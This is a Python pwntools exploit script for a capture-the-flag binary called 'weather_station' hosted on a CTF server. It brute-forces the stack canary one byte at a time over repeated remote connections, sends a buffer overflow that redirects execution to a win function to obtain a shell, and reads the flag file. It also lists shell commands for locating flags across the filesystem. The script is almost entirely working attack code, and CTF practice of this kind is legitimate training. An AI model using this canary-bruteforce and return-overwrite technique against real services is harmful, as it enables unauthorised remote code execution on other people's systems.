#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./weather_station', checksec=False)
HOST, PORT = ('offsec.m0lecon.it',13519) if not args.LOCAL else ('127.0.0.1',5555)


def main():
    OFFSET_CANARY = 56 #retreived using cyclic
    OFFSET_RET = OFFSET_CANARY + 16
    win_addr = 0x0000000000401530 #i can use it since we have no PIE, also retreivable with elf.sym.win
    ret_addr = 0x000000000040101a
    
    #trying to guess the canary: it's 8 byte and the last byte is \x00
    known = b"\x00"

    for i in range(7):
        for b in range(256):
            guess = known + bytes([b])
            payload = b'A'*OFFSET_CANARY + guess

            p = remote(HOST, PORT, level = "error") #context.log_level shortcut for just one connection
            p.recvuntil(b'location: ')
            p.send(b'Triggiano')

            p.recvuntil(b'query: ')
            p.send(payload)
            try:
                data = p.recv(timeout = 0.2)
                #print(data)
            except: 
                data = b''
            p.close()

            if b'sent!' in data:
                known = guess
                log.info(f"Byte {i+1}: {b:02x}")
                break
    
    canary = known
    print(canary)
    log.info(f"Canary found: {u64(canary):x}")

    commands = [
        b'cat /flag',
        b'cat /flag.txt', 
        b'cat /root/flag',
        b'cat /home/user/flag',
        b'find / -name "flag*" 2>/dev/null',
        b'env | grep -i flag',
        b'ls'
    ]

    #make the exploit
    attack = b'A'*OFFSET_CANARY + canary + b'B'*8 + p64(win_addr)
    p2 = remote(HOST,PORT)
    p2.recvuntil(b'location: ')
    p2.send(b'Triggiano')
    p2.recvuntil(b'query: ')
    p2.send(attack)
    print(p2.recvuntil(b'emergency shell:\n'))
    p2.sendline(b'cat /home/user/flag')
    print(p2.recv(timeout=3).decode())
    p.close()




if __name__ == "__main__":
    main()